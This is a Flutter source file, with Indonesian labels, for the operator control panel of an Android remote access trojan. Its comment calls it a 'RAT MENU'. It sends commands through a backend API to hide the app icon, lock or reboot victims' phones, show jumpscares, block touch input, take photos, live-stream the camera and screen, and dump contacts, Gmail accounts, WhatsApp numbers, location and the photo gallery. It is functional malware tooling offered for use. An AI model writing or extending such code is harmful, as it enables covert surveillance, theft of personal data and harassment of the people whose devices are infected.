// lib/pages/control_page.dart
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:video_player/video_player.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import '../widgets/glass_card.dart';
import '../utils/constants.dart';
import '../utils/helpers.dart';

class ControlPage extends StatefulWidget {
  final String deviceId;
  final String deviceName;

  const ControlPage({
    super.key,
    required this.deviceId,
    required this.deviceName,
  });

  @override
  State<ControlPage> createState() => _ControlPageState();
}

class _ControlPageState extends State<ControlPage> {
  late VideoPlayerController _bgController;
  bool _bgReady = false;
  bool _isLoading = false;
  Map<String, dynamic> _deviceStatus = {};

  // ============================================================
  //  RAT MENU — SEMUA COMMAND
  // ============================================================
  final List<Map<String, dynamic>> _controlMenus = [
    // ===== BASIC =====
    {
      'icon': Icons.flashlight_on_rounded,
      'title': 'Flashlight',
      'subtitle': 'Nyalakan senter',
      'type': 'toggle',
      'command': 'flashlight',
      'color': 0xFF4D8FFF,
    },
    {
      'icon': Icons.lock_rounded,
      'title': 'Lock Device',
      'subtitle': 'Kunci perangkat',
      'type': 'action',
      'command': 'lockDevice',
      'color': 0xFFA78BFA,
    },
    {
      'icon': Icons.lock_open_rounded,
      'title': 'Unlock Device',
      'subtitle': 'Buka kunci',
      'type': 'action',
      'command': 'unlockDevice',
      'color': 0xFF34D399,
    },
    {
      'icon': Icons.visibility_off_rounded,
      'title': 'Hide Icon',
      'subtitle': 'Sembunyikan ikon',
      'type': 'toggle',
      'command': 'hideIcon',
      'color': 0xFFFB923C,
    },

    // ===== ATTACK =====
    {
      'icon': Icons.warning_rounded,
      'title': 'Jumpscare',
      'subtitle': 'Fullscreen jumpscare',
      'type': 'toggle',
      'command': 'jumpscare',
      'color': 0xFFFF4D6D,
    },
    {
      'icon': Icons.notifications_active_rounded,
      'title': 'Spam Notif',
      'subtitle': 'Spam dialog 7x',
      'type': 'dialog',
      'command': 'dialogSpam',
      'color': 0xFFE2E8F0,
    },
    {
      'icon': Icons.touch_app_rounded,
      'title': 'Stuck Layar',
      'subtitle': 'Block sentuhan',
      'type': 'dialog',
      'command': 'touchBlock',
      'color': 0xFFFF9F1C,
    },
    {
      'icon': Icons.record_voice_over_rounded,
      'title': 'Text to Speech',
      'subtitle': 'Suruh HP ngomong',
      'type': 'dialog',
      'command': 'ttsSpeak',
      'color': 0xFFA855F7,
    },
    {
      'icon': Icons.volume_off_rounded,
      'title': 'Mute Volume',
      'subtitle': 'Matikan suara',
      'type': 'toggle',
      'command': 'muteVolume',
      'color': 0xFF22C55E,
    },
    {
      'icon': Icons.vibration_rounded,
      'title': 'Vibrate',
      'subtitle': 'Getar device',
      'type': 'dialog',
      'command': 'vibrate',
      'color': 0xFFA78BFA,
    },

    // ===== CAMERA =====
    {
      'icon': Icons.camera_front_rounded,
      'title': 'Foto Depan',
      'subtitle': 'Ambil foto depan',
      'type': 'action',
      'command': 'takePhoto',
      'extra': 'front',
      'color': 0xFFFF4D6D,
    },
    {
      'icon': Icons.camera_rear_rounded,
      'title': 'Foto Belakang',
      'subtitle': 'Ambil foto belakang',
      'type': 'action',
      'command': 'takePhoto',
      'extra': 'back',
      'color': 0xFFFF4D6D,
    },
    {
      'icon': Icons.videocam_rounded,
      'title': 'Stream Camera',
      'subtitle': 'Live camera',
      'type': 'stream',
      'command': 'camera',
      'color': 0xFFFF4D6D,
    },
    {
      'icon': Icons.screen_share_rounded,
      'title': 'Stream Screen',
      'subtitle': 'Live screen HP',
      'type': 'stream',
      'command': 'screen',
      'color': 0xFF22D3EE,
    },

    // ===== DATA GRAB =====
    {
      'icon': Icons.contacts_rounded,
      'title': 'Ambil Kontak',
      'subtitle': 'Dump semua kontak',
      'type': 'grab',
      'command': 'getContacts',
      'color': 0xFFFFC34D,
    },
    {
      'icon': Icons.email_rounded,
      'title': 'Liat Gmail',
      'subtitle': 'Dump akun Gmail',
      'type': 'grab',
      'command': 'getGmail',
      'color': 0xFFF87171,
    },
    {
      'icon': Icons.chat_rounded,
      'title': 'Nomor WA',
      'subtitle': 'Lihat nomor WA',
      'type': 'grab',
      'command': 'getWhatsApp',
      'color': 0xFF25D366,
    },
    {
      'icon': Icons.location_on_rounded,
      'title': 'GPS Lokasi',
      'subtitle': 'Cek lokasi',
      'type': 'grab',
      'command': 'getLocation',
      'color': 0xFF34D399,
    },
    {
      'icon': Icons.photo_library_rounded,
      'title': 'Galeri',
      'subtitle': 'Lihat foto',
      'type': 'grab',
      'command': 'getGallery',
      'color': 0xFF4D8FFF,
    },
    {
      'icon': Icons.phone_rounded,
      'title': 'Info HP',
      'subtitle': 'Lihat info device',
      'type': 'grab',
      'command': 'getPhoneInfo',
      'color': 0xFF34D399,
    },

    // ===== MEDIA =====
    {
      'icon': Icons.wallpaper_rounded,
      'title': 'Wallpaper',
      'subtitle': 'Set URL gambar',
      'type': 'dialog',
      'command': 'setWallpaper',
      'color': 0xFFA78BFA,
    },
    {
      'icon': Icons.public_rounded,
      'title': 'Open Situs',
      'subtitle': 'Buka URL',
      'type': 'dialog',
      'command': 'openUrl',
      'color': 0xFF34D399,
    },
    {
      'icon': Icons.music_note_rounded,
      'title': 'Play Audio',
      'subtitle': 'Putar audio',
      'type': 'dialog',
      'command': 'playAudio',
      'color': 0xFF4D8FFF,
    },
    {
      'icon': Icons.message_rounded,
      'title': 'Toast Message',
      'subtitle': 'Kirim pesan',
      'type': 'dialog',
      'command': 'showToast',
      'color': 0xFFFFC34D,
    },

    // ===== SYSTEM =====
    {
      'icon': Icons.block_rounded,
      'title': 'Block App',
      'subtitle': 'Kelola blokir app',
      'type': 'action',
      'command': 'blockApp',
      'color': 0xFFFF4D6D,
    },
    {
      'icon': Icons.restart_alt_rounded,
      'title': 'Reboot Device',
      'subtitle': 'Restart perangkat',
      'type': 'action',
      'command': 'reboot',
      'color': 0xFFFB923C,
    },
    {
      'icon': Icons.power_settings_new_rounded,
      'title': 'Shutdown',
      'subtitle': 'Matikan perangkat',
      'type': 'action',
      'command': 'shutdown',
      'color': 0xFFFF4D6D,
    },
  ];

  // ============================================================
  //  INIT
  // ============================================================
  @override
  void initState() {
    super.initState();
    _initVideo();
    _loadDeviceStatus();
  }

  void _initVideo() {
    _bgController = VideoPlayerController.asset('assets/videos/zz.mp4')
      ..initialize().then((_) {
        setState(() => _bgReady = true);
        _bgController.setLooping(true);
        _bgController.setVolume(0.0);
        _bgController.play();
      }).catchError((e) => print('BG Video error: $e'));
  }

  Future<void> _loadDeviceStatus() async {
    // Simulasi load status
    setState(() {
      _deviceStatus = {
        'flashlight': false,
        'hideIcon': false,
        'jumpscare': false,
        'muteVolume': false,
        'cameraActive': false,
        'screenActive': false,
      };
    });
  }

  @override
  void dispose() {
    _bgController.dispose();
    super.dispose();
  }

  // ============================================================
  //  SEND COMMAND
  // ============================================================
  Future<void> _sendCommand(String command, {String? extra}) async {
    if (_isLoading) return;
    setState(() => _isLoading = true);

    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('token') ?? '';

      final response = await http.post(
        Uri.parse('${AppConstants.apiBaseUrl}/command'),
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer $token',
        },
        body: jsonEncode({
          'deviceId': widget.deviceId,
          'command': command,
          'extra': extra ?? '',
        }),
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['success'] == true) {
          _showToast('✅ ${command.toUpperCase()} berhasil', Colors.green);
        } else {
          _showToast('❌ ${data['message'] ?? 'Gagal'}', Colors.red);
        }
      } else {
        _showToast('❌ Server error', Colors.red);
      }
    } catch (e) {
      _showToast('❌ Error: $e', Colors.red);
    }

    setState(() => _isLoading = false);
  }

  // ============================================================
  //  TOAST
  // ============================================================
  void _showToast(String message, Color color) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message),
        backgroundColor: color.withOpacity(0.8),
        duration: const Duration(seconds: 2),
        behavior: SnackBarBehavior.floating,
      ),
    );
  }

  // ============================================================
  //  BUILD
  // ============================================================
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.transparent,
      extendBodyBehindAppBar: true,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_rounded, color: Color(0xFFD4AF37)),
          onPressed: () => Navigator.pop(context),
        ),
        title: Text(
          widget.deviceName,
          style: const TextStyle(
            color: Colors.white,
            fontSize: 16,
            fontWeight: FontWeight.bold,
            fontFamily: 'Xenora',
            letterSpacing: 1,
          ),
        ),
        centerTitle: true,
        actions: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
            margin: const EdgeInsets.only(right: 12),
            decoration: BoxDecoration(
              color: const Color(0xFF34D399).withOpacity(0.1),
              borderRadius: BorderRadius.circular(8),
              border: Border.all(
                color: const Color(0xFF34D399).withOpacity(0.15),
              ),
            ),
            child: Row(
              children: [
                Container(
                  width: 6,
                  height: 6,
                  decoration: const BoxDecoration(
                    shape: BoxShape.circle,
                    color: Color(0xFF34D399),
                  ),
                ),
                const SizedBox(width: 4),
                const Text(
                  'ONLINE',
                  style: TextStyle(
                    color: Color(0xFF34D399),
                    fontSize: 8,
                    fontFamily: 'Share Tech Mono',
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
      body: Stack(
        children: [
          if (_bgReady)
            Positioned.fill(
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _bgController.value.size.width,
                  height: _bgController.value.size.height,
                  child: VideoPlayer(_bgController),
                ),
              ),
            )
          else
            Container(color: Colors.black),
          Container(color: Colors.black.withOpacity(0.6)),

          SafeArea(
            child: SingleChildScrollView(
              physics: const BouncingScrollPhysics(),
              padding: const EdgeInsets.fromLTRB(16, 8, 16, 80),
              child: Column(
                children: [
                  // Device Info
                  _buildDeviceInfo(),
                  const SizedBox(height: 16),

                  // Section Label
                  _buildSectionLabel('CONTROL MENU'),
                  const SizedBox(height: 12),

                  // Control Grid
                  GridView.builder(
                    shrinkWrap: true,
                    physics: const NeverScrollableScrollPhysics(),
                    gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                      crossAxisCount: 3,
                      crossAxisSpacing: 8,
                      mainAxisSpacing: 8,
                      childAspectRatio: 0.85,
                    ),
                    itemCount: _controlMenus.length,
                    itemBuilder: (context, index) {
                      final menu = _controlMenus[index];
                      return _buildControlTile(menu);
                    },
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ============================================================
  //  DEVICE INFO
  // ============================================================
  Widget _buildDeviceInfo() {
    return GlassCard(
      padding: const EdgeInsets.all(14),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: const Color(0xFFD4AF37).withOpacity(0.08),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(
                color: const Color(0xFFD4AF37).withOpacity(0.1),
              ),
            ),
            child: const Icon(
              Icons.phone_android_rounded,
              color: Color(0xFFD4AF37),
              size: 24,
            ),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  widget.deviceName,
                  style: const TextStyle(
                    color: Colors.white,
                    fontSize: 14,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Xenora',
                  ),
                ),
                Text(
                  'ID: ${widget.deviceId.substring(0, 16)}...',
                  style: TextStyle(
                    color: Colors.grey.shade500,
                    fontSize: 9,
                    fontFamily: 'Share Tech Mono',
                  ),
                ),
              ],
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
            decoration: BoxDecoration(
              color: const Color(0xFF34D399).withOpacity(0.08),
              borderRadius: BorderRadius.circular(6),
              border: Border.all(
                color: const Color(0xFF34D399).withOpacity(0.1),
              ),
            ),
            child: const Text(
              'ACTIVE',
              style: TextStyle(
                color: Color(0xFF34D399),
                fontSize: 8,
                fontFamily: 'Share Tech Mono',
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ============================================================
  //  SECTION LABEL
  // ============================================================
  Widget _buildSectionLabel(String label) {
    return Row(
      children: [
        Container(
          width: 3,
          height: 14,
          decoration: BoxDecoration(
            color: const Color(0xFFD4AF37),
            borderRadius: BorderRadius.circular(2),
          ),
        ),
        const SizedBox(width: 8),
        Text(
          label,
          style: const TextStyle(
            color: Colors.grey,
            fontSize: 10,
            fontWeight: FontWeight.bold,
            fontFamily: 'Share Tech Mono',
            letterSpacing: 2,
          ),
        ),
      ],
    );
  }

  // ============================================================
  //  CONTROL TILE
  // ============================================================
  Widget _buildControlTile(Map<String, dynamic> menu) {
    final color = Color(menu['color']);
    final isActive = _deviceStatus[menu['command']] == true;
    final isToggle = menu['type'] == 'toggle';
    final isDialog = menu['type'] == 'dialog';
    final isGrab = menu['type'] == 'grab';
    final isStream = menu['type'] == 'stream';

    return GestureDetector(
      onTap: () {
        if (isToggle) {
          _sendCommand(menu['command'], extra: isActive ? 'false' : 'true');
          setState(() {
            _deviceStatus[menu['command']] = !isActive;
          });
        } else if (isDialog) {
          _showDialog(menu);
        } else if (isGrab) {
          _sendCommand(menu['command']);
          _showToast('⏳ Mengambil ${menu['title']}...', Colors.orange);
        } else if (isStream) {
          _showStreamDialog(menu);
        } else {
          _sendCommand(menu['command'], extra: menu['extra']);
        }
      },
      child: GlassCard(
        padding: const EdgeInsets.symmetric(vertical: 10),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 36,
              height: 36,
              decoration: BoxDecoration(
                color: color.withOpacity(0.12),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(
                  color: isActive ? const Color(0xFFD4AF37) : color.withOpacity(0.15),
                ),
              ),
              child: Icon(
                menu['icon'],
                color: isActive ? const Color(0xFFD4AF37) : color,
                size: 16,
              ),
            ),
            const SizedBox(height: 4),
            Text(
              menu['title'],
              style: TextStyle(
                color: isActive ? const Color(0xFFD4AF37) : Colors.white,
                fontSize: 8,
                fontWeight: FontWeight.bold,
                fontFamily: 'Share Tech Mono',
              ),
              textAlign: TextAlign.center,
              maxLines: 2,
              overflow: TextOverflow.ellipsis,
            ),
            if (isToggle)
              Container(
                margin: const EdgeInsets.only(top: 2),
                width: 24,
                height: 10,
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(5),
                  color: isActive ? const Color(0xFFD4AF37) : Colors.grey.shade800,
                ),
                child: Row(
                  children: [
                    AnimatedContainer(
                      duration: const Duration(milliseconds: 200),
                      margin: EdgeInsets.only(
                        left: isActive ? 12 : 1,
                        right: isActive ? 1 : 12,
                      ),
                      width: 8,
                      height: 8,
                      decoration: const BoxDecoration(
                        shape: BoxShape.circle,
                        color: Colors.white,
                      ),
                    ),
                  ],
                ),
              ),
            if (isStream)
              Container(
                margin: const EdgeInsets.only(top: 2),
                padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 1),
                decoration: BoxDecoration(
                  color: const Color(0xFFFF4D6D).withOpacity(0.1),
                  borderRadius: BorderRadius.circular(4),
                  border: Border.all(
                    color: const Color(0xFFFF4D6D).withOpacity(0.15),
                  ),
                ),
                child: const Text(
                  'LIVE',
                  style: TextStyle(
                    color: Color(0xFFFF4D6D),
                    fontSize: 6,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Share Tech Mono',
                  ),
                ),
              ),
          ],
        ),
      ),
    );
  }

  // ============================================================
  //  DIALOG
  // ============================================================
  void _showDialog(Map<String, dynamic> menu) {
    final command = menu['command'];
    final title = menu['title'];
    final controller = TextEditingController();

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: Colors.black.withOpacity(0.95),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(
            color: const Color(0xFFD4AF37).withOpacity(0.2),
          ),
        ),
        title: Text(
          title,
          style: const TextStyle(
            color: Color(0xFFD4AF37),
            fontSize: 16,
            fontWeight: FontWeight.bold,
            fontFamily: 'Xenora',
          ),
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(
              'Masukkan input untuk $title',
              style: TextStyle(
                color: Colors.grey.shade400,
                fontSize: 11,
                fontFamily: 'Share Tech Mono',
              ),
            ),
            const SizedBox(height: 12),
            TextField(
              controller: controller,
              style: const TextStyle(color: Colors.white),
              decoration: InputDecoration(
                hintText: 'Ketik di sini...',
                hintStyle: TextStyle(
                  color: Colors.grey.shade600,
                  fontSize: 12,
                ),
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(8),
                  borderSide: BorderSide(
                    color: Colors.grey.shade800,
                  ),
                ),
                enabledBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(8),
                  borderSide: BorderSide(
                    color: Colors.grey.shade800,
                  ),
                ),
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(8),
                  borderSide: const BorderSide(
                    color: Color(0xFFD4AF37),
                  ),
                ),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text(
              'Batal',
              style: TextStyle(color: Colors.grey),
            ),
          ),
          ElevatedButton(
            onPressed: () {
              final value = controller.text.trim();
              if (value.isNotEmpty) {
                Navigator.pop(context);
                _sendCommand(command, extra: value);
              }
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFFD4AF37),
              foregroundColor: Colors.black,
            ),
            child: const Text('Kirim'),
          ),
        ],
      ),
    );
  }

  void _showStreamDialog(Map<String, dynamic> menu) {
    final command = menu['command'];
    final title = menu['title'];

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: Colors.black.withOpacity(0.95),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(
            color: const Color(0xFFD4AF37).withOpacity(0.2),
          ),
        ),
        title: Text(
          '📡 $title',
          style: const TextStyle(
            color: Color(0xFFD4AF37),
            fontSize: 16,
            fontWeight: FontWeight.bold,
            fontFamily: 'Xenora',
          ),
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const Icon(
              Icons.animation_rounded,
              color: Color(0xFFFF4D6D),
              size: 48,
            ),
            const SizedBox(height: 12),
            Text(
              'Memulai stream $title',
              style: TextStyle(
                color: Colors.grey.shade400,
                fontSize: 12,
                fontFamily: 'Share Tech Mono',
              ),
            ),
            const SizedBox(height: 4),
            Text(
              'Klik START untuk memulai',
              style: TextStyle(
                color: Colors.grey.shade600,
                fontSize: 10,
                fontFamily: 'Share Tech Mono',
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text(
              'Batal',
              style: TextStyle(color: Colors.grey),
            ),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.pop(context);
              _sendCommand(command);
              _showToast('📡 Streaming $title dimulai...', Colors.orange);
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFFFF4D6D),
              foregroundColor: Colors.white,
            ),
            child: const Text('START'),
          ),
        ],
      ),
    );
  }
}